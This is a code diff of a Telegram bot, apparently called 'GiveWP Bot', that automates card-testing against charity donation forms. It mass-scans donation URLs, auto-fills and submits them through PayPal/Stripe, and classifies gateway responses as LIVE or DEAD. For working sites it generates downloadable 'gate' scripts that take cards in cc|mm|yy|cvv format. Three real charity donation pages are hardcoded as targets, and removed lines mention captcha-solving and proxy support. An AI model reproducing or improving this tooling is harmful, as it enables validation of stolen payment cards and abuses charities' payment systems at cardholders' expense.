+    text = """<b>📖 Help</b>
 
-<b>الأوامر:</b>
 <code>/paypal URL</code> — فحص موقع
 <code>/mass</code> — فحص ملف
-<code>/test</code> — فحص سريع
+<code>/test</code> — 3 مواقع
 <code>/stop</code> — إيقاف
 
-<b>البوت يعمل:</b>
-✅ يفتح المتصفح
-✅ يستخرج الفورم (5 طبقات)
-✅ يملأ كل الحقول
-✅ يختار مبلغ (14 مبلغ)
-✅ يضغط تبرع (17 استراتيجية)
-✅ يدخل PayPal/Stripe
-✅ يصنف 100+ كود رد
-✅ يبعت ملف Gate
-
-<b>النتائج:</b>
-✅ LIVE — كارت اترفض (رد حقيقي)
-❌ DEAD — فشل/gateway معطل"""
+✅ LIVE = كارت اترفض (رد حقيقي)
+❌ DEAD = فشل/gateway معطل"""
     try: bot.edit_message_text(text, call.message.chat.id, call.message.message_id)
     except: pass
 
@@ -1181,8 +988,8 @@ def cb_fb(call):
     except: pass
     kb = types.InlineKeyboardMarkup()
     kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="back"))
-    try: bot.edit_message_text("💬 <b>Feedback</b>\n\nSend your message:",
-                               call.message.chat.id, call.message.message_id, reply_markup=kb)
+    try: bot.edit_message_text("💬 Send your message:", call.message.chat.id,
+                               call.message.message_id, reply_markup=kb)
     except: pass
     waiting_users[call.from_user.id] = True
 
@@ -1233,44 +1040,40 @@ def paypal_cmd(msg):
     if len(parts) != 2:
         safe_send(msg.chat.id, "❌ /paypal URL"); return
     url = parts[1].strip()
-    if not url.startswith(("http://", "https://")):
+    if not url.startswith(("http://","https://")):
         safe_send(msg.chat.id, "❌ Invalid URL"); return
-
     sm = safe_send(msg.chat.id, f"🔍 Scanning...\n<code>{url[:80]}</code>")
     if not sm: return
-
     def run():
         t0 = time.time()
         try:
             r = check(url, TEST_CARD)
             dt = time.time() - t0
-            st, code, raw = r["status"], r["code"], r.get("raw", "")
-            dbg = r.get("debug", {})
-
+            st, code, raw = r["status"], r["code"], r.get("raw","")
+            dbg = r.get("debug",{})
             if st == "LIVE":
                 gate = gen_gate(url, dbg, TEST_CARD)
-                host = urlparse(url).netloc.replace(".", "_")
+                host = urlparse(url).netloc.replace(".","_")
                 fn = f"gate_{host}_{int(time.time())}.py"
                 safe_doc(msg.chat.id, gate.encode(), fn, f"✅ Gate: {fn}")
-
-                info = dbg.get("extracted", {})
-                report = f"""✅ <b>𝐆𝐚𝐭𝐞 𝐄𝐱𝐭𝐫𝐚𝐜𝐭𝐞𝐝!</b>
+                info = dbg.get("extracted",{})
+                report = f"""✅ <b>Gate Extracted!</b>
 ━━━━━━━━━━━━━━━━━
-[⚡] <b>Domain:</b> <code>{urlparse(url).netloc}</code>
-[⚡] <b>Form ID:</b> <code>{info.get("form_id", "?")}</code>
-[⚡] <b>Amount:</b> <code>${dbg.get("amount", "?")}</code>
-[⚡] <b>Platform:</b> <code>{dbg.get("platform", "?")}</code>
-[⚡] <b>Time:</b> <code>{datetime.now().strftime("%H:%M:%S")}</code>
+[⚡] Domain: <code>{urlparse(url).netloc}</code>
+[⚡] Form: <code>{info.get("form_id","?")}</code>
+[⚡] Amount: <code>${dbg.get("amount","?")}</code>
+[⚡] Platform: <code>{dbg.get("platform","?")}</code>
+[⚡] Time: <code>{datetime.now().strftime("%H:%M:%S")}</code>
 ━━━━━━━━━━━━━━━━━
 🧪 <b>Gate Test:</b>
-[⚡] <b>Card:</b> <code>{TEST_CARD[:10]}****</code>
-[⚡] <b>Response:</b> <code>{code}</code>
-[⚡] <b>Status:</b> ✅ LIVE
-[⚡] <b>Elapsed:</b> <code>{dt:.1f}s</code>
+[⚡] Card: <code>{TEST_CARD[:10]}****</code>
+[⚡] Response: <code>{code}</code>
+[⚡] Status: ✅ LIVE
+[⚡] Elapsed: <code>{dt:.1f}s</code>
 ━━━━━━━━━━━━━━━━━
-[⚡] 📄 <b>Ready!</b>
-[⚡] 📝 <b>Function:</b> <code>(cc)</code>
-[⚡] 📌 <b>Format:</b> <code>cc|mm|yy|cvv</code>"""
+📄 <b>Ready!</b>
+📝 <b>Function:</b> <code>(cc)</code>
+📌 <b>Format:</b> <code>cc|mm|yy|cvv</code>"""
                 safe_edit(msg.chat.id, sm.message_id, report)
             else:
                 txt = f"❌ <b>{st}</b> | <code>{code}</code>\n\n🔗 <code>{url[:100]}</code>\n⏱️ {dt:.1f}s"
@@ -1278,7 +1081,6 @@ def paypal_cmd(msg):
                 safe_edit(msg.chat.id, sm.message_id, txt)
         except Exception as e:
             safe_edit(msg.chat.id, sm.message_id, f"❌ {str(e)[:200]}")
-
     threading.Thread(target=run, daemon=True).start()
 
 
@@ -1287,13 +1089,12 @@ def test_cmd(msg):
     if is_blocked(msg.from_user.id):
         safe_send(msg.chat.id, "🚫 Blocked."); return
     sites = [
-        ("dandelions", "https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1"),
-        ("stychno", "https://www.stychnohumanitarianfoundation.com/donations/donation-form/"),
-        ("svdp", "https://svdpvenicefl.org/donations/donations/"),
+        ("dandelions","https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1"),
+        ("stychno","https://www.stychnohumanitarianfoundation.com/donations/donation-form/"),
+        ("svdp","https://svdpvenicefl.org/donations/donations/"),
     ]
     sm = safe_send(msg.chat.id, f"🔍 Testing {len(sites)}...")
     if not sm: return
-
     def run():
         results = []
         for n, u in sites:
@@ -1302,9 +1103,8 @@ def test_cmd(msg):
             results.append((n, r["status"], r["code"]))
         txt = "<b>📊 Results:</b>\n\n"
         for n, s, c in results:
-            txt += f"{'✅' if s == 'LIVE' else '❌'} <b>{n}</b>: {c}\n"
+            txt += f"{'✅' if s=='LIVE' else '❌'} <b>{n}</b>: {c}\n"
         safe_edit(msg.chat.id, sm.message_id, txt)
-
     threading.Thread(target=run, daemon=True).start()
 
 
@@ -1322,19 +1122,14 @@ def handle_mass(msg):
     try:
         fi = bot.get_file(msg.document.file_id)
         data = bot.download_file(fi.file_path)
-        links = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
+        links = [l.strip() for l in data.decode("utf-8",errors="ignore").splitlines() if l.strip()]
         if not links:
             safe_send(msg.chat.id, "❌ Empty"); return
-
-        uid = msg.from_user.id
-        chat = msg.chat.id
-        total = len(links)
-        processing_status[uid] = {"stop": False, "done": False, "live": 0, "dead": 0,
-                                   "current": "", "total": total, "processed": 0}
-
+        uid = msg.from_user.id; chat = msg.chat.id; total = len(links)
+        processing_status[uid] = {"stop":False,"done":False,"live":0,"dead":0,
+                                   "current":"","total":total,"processed":0}
         sm = safe_send(chat, f"📊 Scanning {total}...")
         if not sm: return
-
         def updater():
             last = ""
             while True:
@@ -1342,8 +1137,8 @@ def handle_mass(msg):
                 try:
                     if processing_status[uid]["done"]: break
                     st = processing_status[uid]
-                    pct = int(st["processed"] / total * 100) if total else 0
-                    bar = "█" * int(pct / 5) + "░" * (20 - int(pct / 5))
+                    pct = int(st["processed"]/total*100) if total else 0
+                    bar = "█"*int(pct/5) + "░"*(20-int(pct/5))
                     txt = f"""📊 <b>Scanning...</b>
 ━━━━━━━━━━━━━━━━━
 📌 Total: {total}
@@ -1358,9 +1153,7 @@ def handle_mass(msg):
                         try: bot.edit_message_text(txt, chat, sm.message_id); last = txt
                         except: pass
                 except: pass
-
         threading.Thread(target=updater, daemon=True).start()
-
         def worker():
             for i, link in enumerate(links):
                 if processing_status[uid].get("stop"): break
@@ -1370,14 +1163,13 @@ def handle_mass(msg):
                     processing_status[uid]["processed"] += 1
                     if r["status"] == "LIVE":
                         processing_status[uid]["live"] += 1
-                        gate = gen_gate(link, r.get("debug", {}), TEST_CARD)
-                        host = urlparse(link).netloc.replace(".", "_")
+                        gate = gen_gate(link, r.get("debug",{}), TEST_CARD)
+                        host = urlparse(link).netloc.replace(".","_")
                         fn = f"gate_{host}_{int(time.time())}.py"
                         safe_doc(chat, gate.encode(), fn, f"✅ {link[:60]}\n📄 {fn}")
                     else:
                         processing_status[uid]["dead"] += 1
                 except: pass
-
             processing_status[uid]["done"] = True
             st = processing_status[uid]
             final = f"""📊 <b>Done!</b>
@@ -1385,9 +1177,8 @@ def handle_mass(msg):
 📌 Total: {total}
 ✅ Live: {st["live"]}
 ❌ Dead: {st["dead"]}
-💯 Rate: {int(st["live"] / total * 100) if total else 0}%"""
+💯 Rate: {int(st["live"]/total*100) if total else 0}%"""
             safe_edit(chat, sm.message_id, final)
-
         threading.Thread(target=worker, daemon=True).start()
     except Exception as e:
         safe_send(msg.chat.id, f"❌ {str(e)[:100]}")
@@ -1409,7 +1200,7 @@ def block_cmd(msg):
         safe_send(msg.chat.id, "🚫 No permission"); return
     try:
         uid = msg.text.split()[1]
-        with open("blockusers.txt", "a") as f: f.write(f"{uid}\n")
+        with open("blockusers.txt","a") as f: f.write(f"{uid}\n")
         safe_send(msg.chat.id, f"✅ Blocked {uid}")
     except: safe_send(msg.chat.id, "Usage: /block2 ID")
 
@@ -1421,21 +1212,16 @@ def unblock_cmd(msg):
     try:
         uid = msg.text.split()[1]
         with open("blockusers.txt") as f: lines = f.readlines()
-        with open("blockusers.txt", "w") as f:
+        with open("blockusers.txt","w") as f:
             for l in lines:
                 if l.strip() != uid: f.write(l)
         safe_send(msg.chat.id, f"✅ Unblocked {uid}")
     except: safe_send(msg.chat.id, "Usage: /unblock2 ID")
 
 
-# ═══════════════════════════════════════════════════════════════
-# MAIN
-# ═══════════════════════════════════════════════════════════════
 if __name__ == "__main__":
-    print("🔥 GiveWP Bot v28 — LEGENDARY")
+    print("🔥 GiveWP Bot v28 — Complete")
     print(f"Playwright: {'✅' if HAS_PW else '❌'}")
-    print(f"2captcha: {'✅' if TWOCAPTCHA_KEY else '❌'}")
-    print(f"Proxy: {'✅' if PROXY_URL else '❌'}")
     while True:
         try:
             bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
@@ -1444,5 +1230,5 @@ if __name__ == "__main__":
         except Exception as e:
             err = str(e)
             if "409" in err or "Conflict" in err:
-                print(f"⚠️ 409 — waiting 15s"); time.sleep(15); continue
+                print(f"⚠️ 409 — 15s"); time.sleep(15); continue
             print(f"❌ {err[:100]}"); time.sleep(5)
